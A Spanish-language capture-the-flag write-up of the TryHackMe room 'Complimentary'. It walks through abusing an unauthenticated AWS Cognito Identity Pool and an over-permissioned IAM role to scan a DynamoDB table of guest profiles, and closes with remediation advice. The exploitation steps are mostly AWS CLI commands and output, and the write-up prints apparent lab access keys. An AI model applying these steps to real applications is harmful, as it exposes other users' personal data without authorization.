---
title: "Complimentary"
date: 2026-07-29 09:11:00 -0400
description: "Análisis de una aplicación wellness que otorga credenciales AWS Cognito sin autenticación, permitiendo el acceso no autorizado a una tabla DynamoDB completa mediante un rol IAM sobre-permisado."
categories: [TryHackMe, Hacker Holidays 2026]
tags: [AWS, Cognito, DynamoDB, IAM, Cloud, Easy, Hacker Holidays 2026]
---

> 📌 **Ficha Técnica**
> - **Plataforma:** TryHackMe
> - **Evento/Sala:** Hacker Holidays 2026 — Complimentary
> - **Dificultad:** Fácil
> - **Categoría:** Cloud
> - **Técnicas Clave:** Reconocimiento de credenciales hardcodeadas, abuso de AWS Cognito Identity Pools, escalada de privilegios mediante rol IAM sobre-permisado, exfiltración de datos DynamoDB

---

## Introducción

La sala **Complimentary** forma parte del evento **Hacker Holidays 2026** de TryHackMe. La premisa es simple pero peligrosa: una aplicación de bienestar llamada *Byte Lotus Wellness* nunca pide inicio de sesión, pero "sabe cosas de ti" al abrirla. Esto sugiere que existe un mecanismo en el backend que entrega credenciales de AWS de forma transparente al usuario, sin autenticación previa.

El objetivo es identificar ese mecanismo, obtener las credenciales temporales que emite, y abusar de los permisos excesivos del rol IAM asociado para extraer datos de otros huéspedes almacenados en DynamoDB.

---

## Reconocimiento

### Inspección del Frontend

Al acceder a la aplicación desplegada en S3, la interfaz muestra un perfil de bienestar personalizado sin haber iniciado sesión. Esto es la primera pista: **algo en el navegador está obteniendo credenciales de AWS automáticamente**.

Abrimos las **DevTools** del navegador (`F12`) y revisamos el código fuente, específicamente el archivo `app.js`. Allí encontramos la configuración de AWS hardcodeada en texto plano:

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.region = AWS_REGION;
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});
```

> **Hallazgo clave:** La aplicación utiliza un **AWS Cognito Identity Pool** para usuarios no autenticados (unauthenticated guest access). Esto permite que cualquier visitante obtenga credenciales temporales de AWS sin necesidad de login.
{: .prompt-info }

---

## Explotación

### Paso 1: Obtener un Identity ID de Cognito

Con el `IdentityPoolId` extraído del frontend, solicitamos un identificador de sesión único mediante el AWS CLI:

```bash
aws cognito-identity get-id   --region us-east-1   --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
```

**Respuesta:**

```json
{
    "IdentityId": "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13"
}
```

### Paso 2: Obtener Credenciales Temporales de AWS

Usando el `IdentityId`, solicitamos las credenciales IAM temporales asociadas a la sesión de invitado:

```bash
aws cognito-identity get-credentials-for-identity   --region us-east-1   --identity-id "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13"
```

**Respuesta:**

```json
{
    "IdentityId": "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13",
    "Credentials": {
        "AccessKeyId": "ASIAU2VYTBGYKP67ULN3",
        "SecretKey": "s20bKrmdV3va1tC8TQUoJ1lrc11yqAXRmXwkzqMi",
        "SessionToken": "IQoJb3JpZ2luX2VjELv...",
        "Expiration": "2026-07-29T20:56:55+01:00"
    }
}
```

### Paso 3: Configurar las Credenciales en el Entorno

Exportamos las credenciales obtenidas para operar con el AWS CLI bajo el contexto del rol de invitado:

```bash
export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYKP67ULN3"
export AWS_SECRET_ACCESS_KEY="s20bKrmdV3va1tC8TQUoJ1lrc11yqAXRmXwkzqMi"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjELv..."
export AWS_DEFAULT_REGION="us-east-1"
```

Verificamos la identidad asumida:

```bash
aws sts get-caller-identity
```

**Respuesta:**

```json
{
    "UserId": "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
    "Account": "332173347248",
    "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
}
```

> **Confirmación:** Estamos operando bajo el rol `complimentary-cognito-unauth-role`, asignado automáticamente por Cognito a usuarios no autenticados.
{: .prompt-info }

### Paso 4: Escaneo Completo de la Tabla DynamoDB

Con las credenciales activas, ejecutamos un `scan` sobre la tabla DynamoDB. El frontend filtraba los resultados en el cliente (solo mostraba el perfil del visitante actual), pero al interactuar directamente con la API de AWS, **no existe ninguna restricción a nivel de fila** (row-level security):

```bash
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles
```

**Respuesta (resumida):**

```json
{
    "Items": [
        {
            "guest_id": { "S": "guest-vibe" },
            "name": { "S": "Vibe (Move Fast & Break Things)" },
            "email": { "S": "vibe@hackerholidays.thm" }
        },
        {
            "guest_id": { "S": "guest-lambo" },
            "name": { "S": "Lambo (@0xMia)" },
            "email": { "S": "lambo@hackerholidays.thm" }
        },
        {
            "guest_id": { "S": "guest-vip-042" },
            "name": { "S": "Guest VIP-042" },
            "notes": {
                "S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{fr33_app_fr33_d4t4!}"
            }
        }
    ],
    "Count": 5,
    "ScannedCount": 5
}
```

> **¡Atención!** El rol IAM `complimentary-cognito-unauth-role` posee el permiso `dynamodb:Scan` sobre toda la tabla, violando el principio de mínimo privilegio. En un entorno de producción, este permiso debería estar restringido a operaciones `GetItem` o `Query` con condiciones sobre `guest_id`.
{: .prompt-warning }

---

## Flag

```
THM{fr33_app_fr33_d4t4!}
```

---

## Conclusión / Retroalimentación

La sala **Complimentary** es un excelente ejercicio introductorio al **pentesting en la nube (Cloud Security)**. El vector de ataque es clásico en entornos AWS mal configurados:

1. **Credenciales expuestas en el cliente:** El `IdentityPoolId` no debería considerarse un secreto por sí solo, pero su combinación con un rol IAM sobre-permisado es letal.
2. **Falta de autorización a nivel de fila:** El frontend filtraba datos, pero el backend no. Nunca confiar en la validación del cliente.
3. **Principio de mínimo privilegio violado:** Un rol para usuarios anónimos no debería tener permiso de `Scan` completo sobre una tabla que contiene datos de múltiples usuarios.

**Aprendizajes clave:**
- Siempre inspeccionar el código JavaScript de aplicaciones SPA que interactúan con servicios AWS.
- Los **Cognito Identity Pools** para invitados son un vector común si el rol IAM asociado no está debidamente restringido.
- Implementar **IAM Policy Conditions** o **DynamoDB Fine-Grained Access Control (FGAC)** para restringir el acceso a nivel de fila basado en el `cognito-identity` del usuario.

La dificultad es adecuada para principiantes en Cloud, y la narrativa del evento Hacker Holidays hace que el reto sea entretenido. ¡Muy recomendada para quienes comienzan en AWS Security!
